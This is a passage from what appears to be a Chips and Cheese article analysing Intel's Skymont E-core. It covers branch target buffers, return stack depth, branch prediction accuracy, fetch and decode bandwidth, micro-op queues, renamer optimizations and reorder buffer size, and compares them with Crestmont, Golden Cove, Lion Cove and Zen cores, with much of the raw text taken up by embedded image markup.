src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc00aea46-c505-4acd-9ed8-086d165bb594_872x500.png" width="688" height="394" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/c00aea46-c505-4acd-9ed8-086d165bb594_872x500.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:394,&quot;width&quot;:688,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:&quot;&quot;,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:&quot;https://chipsandcheese.com/skt_btb/&quot;,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" title="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc00aea46-c505-4acd-9ed8-086d165bb594_872x500.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc00aea46-c505-4acd-9ed8-086d165bb594_872x500.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc00aea46-c505-4acd-9ed8-086d165bb594_872x500.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc00aea46-c505-4acd-9ed8-086d165bb594_872x500.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>Crestmont for comparison has a 6K entry last level BTB. Both E-Cores have smaller BTBs than recent high performance cores. Golden Cove has a 12K entry BTB, and AMD’s Zen 5 has a massive 24K BTB entries. Still, 8K BTB entries is nothing to scoff at. It’s more entries than older high performance cores like Sunny Cove or Zen 2.</p><div><figure><a target="_blank" href="https://chipsandcheese.com/2024/05/13/meteor-lakes-e-cores-crestmont-makes-incremental-progress/crestmont_btb/" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F236829cf-97bc-4d35-b1ad-8861e1e3ed53_962x536.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F236829cf-97bc-4d35-b1ad-8861e1e3ed53_962x536.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F236829cf-97bc-4d35-b1ad-8861e1e3ed53_962x536.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F236829cf-97bc-4d35-b1ad-8861e1e3ed53_962x536.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F236829cf-97bc-4d35-b1ad-8861e1e3ed53_962x536.png" width="688" height="383" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/236829cf-97bc-4d35-b1ad-8861e1e3ed53_962x536.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:383,&quot;width&quot;:688,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:&quot;&quot;,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:&quot;https://chipsandcheese.com/2024/05/13/meteor-lakes-e-cores-crestmont-makes-incremental-progress/crestmont_btb/&quot;,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" title="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F236829cf-97bc-4d35-b1ad-8861e1e3ed53_962x536.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F236829cf-97bc-4d35-b1ad-8861e1e3ed53_962x536.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F236829cf-97bc-4d35-b1ad-8861e1e3ed53_962x536.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F236829cf-97bc-4d35-b1ad-8861e1e3ed53_962x536.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>Cache speed matters too, because taken branch latency can reduce frontend throughput. Skymont and Crestmont both have a first level 1024 entry BTB capable of zero bubble taken branches (single cycle latency). It’s faster than the 3-4 cycle latency L2 BTB, but can’t do two taken branches per cycle like Intel and AMD’s latest cores.</p><p>Returns are predicted via a return stack, because they usually go back to a corresponding call site. Skymont has a very deep 128 entry return stack, a feature inherited from Crestmont. Calls and returns have to be spaced by at least one cacheline to utilize this return stack, which complicated microbenchmarking but shouldn’t affect typical applications.</p><div><figure><a target="_blank" href="https://chipsandcheese.com/skymont_returnstack/" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2ea1ca88-069f-4d5a-a53b-efb29848f5f6_880x500.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2ea1ca88-069f-4d5a-a53b-efb29848f5f6_880x500.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2ea1ca88-069f-4d5a-a53b-efb29848f5f6_880x500.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2ea1ca88-069f-4d5a-a53b-efb29848f5f6_880x500.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2ea1ca88-069f-4d5a-a53b-efb29848f5f6_880x500.png" width="688" height="391" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/2ea1ca88-069f-4d5a-a53b-efb29848f5f6_880x500.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:391,&quot;width&quot;:688,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:&quot;&quot;,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:&quot;https://chipsandcheese.com/skymont_returnstack/&quot;,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" title="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2ea1ca88-069f-4d5a-a53b-efb29848f5f6_880x500.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2ea1ca88-069f-4d5a-a53b-efb29848f5f6_880x500.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2ea1ca88-069f-4d5a-a53b-efb29848f5f6_880x500.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2ea1ca88-069f-4d5a-a53b-efb29848f5f6_880x500.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>For comparison, AMD’s Zen 5 has 2×52 entry return stacks, one for each thread. Skymont’s P-Core companion, Lion Cove, has a 24 entry return stack.</p><div><figure><a target="_blank" href="https://chipsandcheese.com/skymont_spec_bpu_accuracy/" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb1ad11b7-c874-4ce8-b9b4-50908810c64b_1495x757.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb1ad11b7-c874-4ce8-b9b4-50908810c64b_1495x757.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb1ad11b7-c874-4ce8-b9b4-50908810c64b_1495x757.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb1ad11b7-c874-4ce8-b9b4-50908810c64b_1495x757.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb1ad11b7-c874-4ce8-b9b4-50908810c64b_1495x757.png" width="688" height="348" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/b1ad11b7-c874-4ce8-b9b4-50908810c64b_1495x757.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:348,&quot;width&quot;:688,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:&quot;&quot;,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:&quot;https://chipsandcheese.com/skymont_spec_bpu_accuracy/&quot;,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" title="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb1ad11b7-c874-4ce8-b9b4-50908810c64b_1495x757.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb1ad11b7-c874-4ce8-b9b4-50908810c64b_1495x757.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb1ad11b7-c874-4ce8-b9b4-50908810c64b_1495x757.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb1ad11b7-c874-4ce8-b9b4-50908810c64b_1495x757.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>In SPEC CPU2017’s workloads, Skymont posts a decent improvement in branch prediction accuracy over its predecessor. The geometric mean of branch prediction accuracy across all subtests goes up from 98.09% to 98.21%. It may seem like a minor step forward, but that’s because many of SPEC CPU2017’s workloads were easy to predict in the first place. Difficult benchmarks like 541.leela, 505.mcf, and 526.blender saw 4.83%, 5%, and 13.58% reductions in branch MPKI respectively.</p><p>Leapfrogging fetch and decode clusters have been a distinguishing feature of Intel’s E-Core line ever since Tremont. Skymont doubles down by adding another decode cluster, for a total of three clusters capable of decoding a total of nine instructions per cycle. Unlike AMD and Intel’s high performance cores, there is no micro-op cache or loop buffer. The fetch and decode path is the primary and only method of instruction delivery.</p><div><figure><a target="_blank" href="https://chipsandcheese.com/skymont_ifetch8/" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F68c60a41-9532-47f6-b648-bd60d6fb1bd5_1358x601.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F68c60a41-9532-47f6-b648-bd60d6fb1bd5_1358x601.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F68c60a41-9532-47f6-b648-bd60d6fb1bd5_1358x601.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F68c60a41-9532-47f6-b648-bd60d6fb1bd5_1358x601.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F68c60a41-9532-47f6-b648-bd60d6fb1bd5_1358x601.png" width="688" height="304" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/68c60a41-9532-47f6-b648-bd60d6fb1bd5_1358x601.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:304,&quot;width&quot;:688,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:&quot;&quot;,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:&quot;https://chipsandcheese.com/skymont_ifetch8/&quot;,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" title="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F68c60a41-9532-47f6-b648-bd60d6fb1bd5_1358x601.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F68c60a41-9532-47f6-b648-bd60d6fb1bd5_1358x601.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F68c60a41-9532-47f6-b648-bd60d6fb1bd5_1358x601.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F68c60a41-9532-47f6-b648-bd60d6fb1bd5_1358x601.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>With 8-byte NOPs, instruction fetch bandwidth maxes out at 48 bytes per cycle. It’s a clear improvement over Crestmont, though I wonder why it’s not better on both. Each decode cluster can fetch 32 bytes per cycle, and the three decode slots in each cluster should only need 24 bytes per cycle in this test. But here, each cluster seems to cap out at 16 bytes per cycle. Lion Cove and Zen 5 can use their micro-op caches to achieve 64 bytes per cycle in this test.</p><div><figure><a target="_blank" href="https://chipsandcheese.com/skymont_ifetch4/" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe135f45a-e5f5-4b82-9c45-4565cae002a5_1357x608.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe135f45a-e5f5-4b82-9c45-4565cae002a5_1357x608.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe135f45a-e5f5-4b82-9c45-4565cae002a5_1357x608.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe135f45a-e5f5-4b82-9c45-4565cae002a5_1357x608.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe135f45a-e5f5-4b82-9c45-4565cae002a5_1357x608.png" width="688" height="308" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/e135f45a-e5f5-4b82-9c45-4565cae002a5_1357x608.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:308,&quot;width&quot;:688,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:&quot;&quot;,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:&quot;https://chipsandcheese.com/skymont_ifetch4/&quot;,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" title="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe135f45a-e5f5-4b82-9c45-4565cae002a5_1357x608.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe135f45a-e5f5-4b82-9c45-4565cae002a5_1357x608.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe135f45a-e5f5-4b82-9c45-4565cae002a5_1357x608.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe135f45a-e5f5-4b82-9c45-4565cae002a5_1357x608.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>4 byte NOPs more closely correspond to average instruction length in integer code, and usually moves the bottleneck to the decoders rather than instruction fetch bandwidth. Even though Skymont has 9 decode slots, sustained throughput is limited to 8 instructions per cycle by the subsequent rename stage.</p><p>For larger code footprints, Skymont and Crestmont can run code from L2 at just under 20 bytes per cycle. That’s good for 4 IPC with 4 byte instructions, which is still plenty considering IPC is often limited to far less than that by factors like backend memory latency.</p><div><figure><a target="_blank" href="https://chipsandcheese.com/?attachment_id=32579" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3369719a-0d23-4988-ba78-713339795e3d_1368x763.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3369719a-0d23-4988-ba78-713339795e3d_1368x763.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3369719a-0d23-4988-ba78-713339795e3d_1368x763.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3369719a-0d23-4988-ba78-713339795e3d_1368x763.jpeg 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3369719a-0d23-4988-ba78-713339795e3d_1368x763.jpeg" width="688" height="384" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/3369719a-0d23-4988-ba78-713339795e3d_1368x763.jpeg&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:384,&quot;width&quot;:688,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:&quot;&quot;,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:&quot;https://chipsandcheese.com/?attachment_id=32579&quot;,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" title="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3369719a-0d23-4988-ba78-713339795e3d_1368x763.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3369719a-0d23-4988-ba78-713339795e3d_1368x763.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3369719a-0d23-4988-ba78-713339795e3d_1368x763.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3369719a-0d23-4988-ba78-713339795e3d_1368x763.jpeg 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>Decoders feed micro-ops into queues in front of the renamer, which help absorb short duration delays. Besides a 3-wide decoder, a frontend cluster includes its own micro-op queue. Copy-pasting the cluster again brings micro-op queue capacity from 2×32 = 64 on Crestmont to 3×32 = 96 entries in Skymont. It’s nowhere near the 192 entry micro-op queue capacity on Lion Cove, but it does get close to some older cores. For reference, Zen 4 has a 144 entry micro-op queue.</p><p>Next, the renamer stage sends micro-ops to the backend, allocating entries in all the necessary resources in the process. The renamer in Intel’s E-Cores simultaneously reads from all of the frontend clusters’s micro-op queues, putting the instruction stream back in-order for register renaming. Besides register renaming, the rename/allocate stage often performs other optimizations to break false dependenices and expose more parallelism to the backend.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5b696be8-8579-4632-9fc9-81119dea422d_1073x514.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5b696be8-8579-4632-9fc9-81119dea422d_1073x514.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5b696be8-8579-4632-9fc9-81119dea422d_1073x514.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5b696be8-8579-4632-9fc9-81119dea422d_1073x514.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5b696be8-8579-4632-9fc9-81119dea422d_1073x514.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5b696be8-8579-4632-9fc9-81119dea422d_1073x514.png" width="1073" height="514" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/5b696be8-8579-4632-9fc9-81119dea422d_1073x514.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:514,&quot;width&quot;:1073,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:53944,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5b696be8-8579-4632-9fc9-81119dea422d_1073x514.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5b696be8-8579-4632-9fc9-81119dea422d_1073x514.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5b696be8-8579-4632-9fc9-81119dea422d_1073x514.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5b696be8-8579-4632-9fc9-81119dea422d_1073x514.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>Skymont can eliminate register to register MOVs and recognize zeroing idioms at full rate. That doesn’t always apply, as subtracting a register from itself no longer seems to be recognized. Compared to Crestmont, Skymont has also gained Golden Cove’s ability to do simple math completely within the renamer. Integer adds with an immediate can execute at more than one per cycle. It’s not as crazy as Golden Cove’s six dependent increments or add-immediates per cycle, but it could still speed up tiny loops by resolving the loop increment dependency chain faster.</p><p>It’s hard to understate the size of Skymont’s out-of-order execution engine. Its reorder buffer (ROB) has 416 entries, up from 256 in Crestmont. The ROB is an in-order list of all in-flight instructions, and an upper bound on how many micro-ops the core has in flight. For that reason, I think ROB capacity gives an idea of the reordering capacity that designers were targeting. Skymont’s ROB is larger than Sunny Cove or Zen 4’s, and not far off the 512 entry ROB in Golden Cove.</p><div><figure><a target="_blank" href="https://chipsandcheese.com/?attachment_id=32575" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff0845404-e10b-4892-8cba-d222a73851ec_1072x444.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff0845404-e10b-4892-8cba-d222a73851ec_1072x444.png 848w, 